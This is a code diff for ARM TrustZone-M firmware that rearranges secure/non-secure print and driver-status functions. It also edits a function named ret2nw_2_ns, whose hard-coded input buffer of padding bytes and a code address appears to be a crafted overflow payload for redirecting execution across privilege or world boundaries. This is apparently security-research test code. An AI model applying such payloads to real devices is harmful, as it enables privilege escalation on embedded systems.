@@ -54,16 +54,28 @@ void __attribute__((naked)) SVC_Handler(void)
 	);
 }
 
-/**
- * \brief BXNS - IPSR
- */
 
 void print_in_s_handler(char* content)
 {
 	print_nsc(content);
-	__NOP();__NOP();__NOP();__NOP();__NOP();
-	__NOP();__NOP();__NOP();__NOP();
+// 	__NOP();__NOP();__NOP();__NOP();__NOP();
+// 	__NOP();__NOP();__NOP();__NOP();
 }
+
+void print_chk_in_s_handler(char* content)
+{
+	print_chk_nsc(content);
+}
+
+/* This function is supposed to execute in P */
+int get_driver_status()
+{
+	return 0;
+}
+
+/**
+ * \brief BXNS - IPSR
+ */
 
 void print_in_s_ns(char* user_str)
 {
@@ -102,11 +114,6 @@ void func_up_ns()
  * \brief BLXNS - IPSR
  */
 
-void print_chk_in_s_handler(char* content)
-{
-	print_chk_nsc(content);
-}
-
 void print_chk_in_s_ns(char* user_str)
 {
 	register char* r0 __asm("r0") = user_str;
@@ -122,16 +129,9 @@ void ret2nw_2_ns()
 	char user_input[32] = {
 		0x20,0x20,0x20,0x20,
 		0x21,0x21,0x21,0x21,
-		0xbc,0x83,0x00,0x00};
+		0x3e,0x83,0x00,0x00};
 	print_chk_in_s_ns(user_input);
 	func_up_ns();
-}
-
-
-/* This function is supposed to execute in P */
-int get_driver_status()
-{
-	return 0;
 }
 
 /**
